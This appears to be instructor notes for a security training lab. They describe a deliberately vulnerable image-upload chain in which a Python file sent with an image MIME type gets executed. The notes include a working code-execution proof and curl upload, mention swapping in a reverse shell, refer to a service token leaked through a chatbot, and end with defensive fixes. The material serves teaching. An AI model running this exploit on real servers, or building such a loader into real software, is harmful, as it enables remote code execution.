# Vulnerable upload chain: instructor notes (Stage 7-9)

**Do not link this file from student-facing pages.**

## The chain, layer by layer

| Layer | File | What it checks | Attacker-controlled? |
|---|---|---|---|
| Frontend (conceptual) | n/a — this is an internal, non-browser API | filename extension | n/a |
| API | `app/routes/api_images.py::upload_image` | multipart `Content-Type` header of the file part | **Yes, fully** |
| Auth | `app/routes/api_images.py::_require_service_token` | `X-Service-Token` header hashed and compared against the current rotated support-image-service credential (`app/services/credentials.py`) | Yes, if the current value is leaked (Stage 6) |
| Storage | `_weak_sanitize_filename` | strips path separators only; keeps extension verbatim | Yes |
| Processing | `vulnerable/upload/image_processor.py` | branches on **filename extension** | Yes |

The API validates the file's declared MIME type. Storage and processing
both trust the **filename**. Those are two different, attacker-controlled
signals that were never required to agree. A file can be named `plugin.py`
while its multipart part claims `Content-Type: image/jpeg` — passes API
validation, then gets executed by the processing stage because it ends in
`.py`.

## Minimal reproduction (once the service token is known)

```bash
cat > plugin.py <<'EOF'
import os
os.makedirs("/opt/shop/uploads/images/pwned_proof", exist_ok=True)
with open("/opt/shop/uploads/images/pwned_proof/it_worked.txt", "w") as f:
    f.write("code execution as: " + os.popen("id").read())
EOF

curl -s -X POST http://TARGET:5000/api/images/upload \
  -H "X-Service-Token: <token discovered via chatbot>" \
  -F "file=@plugin.py;type=image/jpeg"
```

`spec.loader.exec_module()` in `image_processor.py` runs the file's
top-level code immediately on upload — no further steps needed. From here
a student can write a reverse shell payload instead of a proof file to get
an interactive `appuser` shell for Stage 9 (local enumeration).

## Why this is a good training vulnerability

- Deterministic: no reliance on a specific image-library CVE, no null-byte
  tricks, nothing version-dependent.
- Realistic shape: "validate the Content-Type header" is an extremely
  common (wrong) shortcut; "support pluggable processing based on file
  extension" is a realistic feature shape too.
- Clearly demonstrates *why* validation layers must agree: each individual
  check here is "reasonable" in isolation, and the vulnerability only
  exists because two different layers each trusted a different,
  attacker-controlled signal.

## Defensive fix

- Validate actual file content (magic-byte sniffing, e.g. `imghdr`/`filetype`
  equivalents, or re-encoding through a trusted image library) rather than
  a client-supplied header or a filename extension.
- Never derive executable behavior from an uploaded filename.
- Store uploads under a randomly generated name with no attacker-chosen
  extension, and serve them with a fixed, safe `Content-Type` regardless of
  what was uploaded.
- Run any real image-processing step in a sandboxed, non-code-executing
  worker (e.g. a locked-down container with no interpreter available) and
  treat "load a Python file as a plugin from an upload directory" as
  something that should never exist as a feature at all.
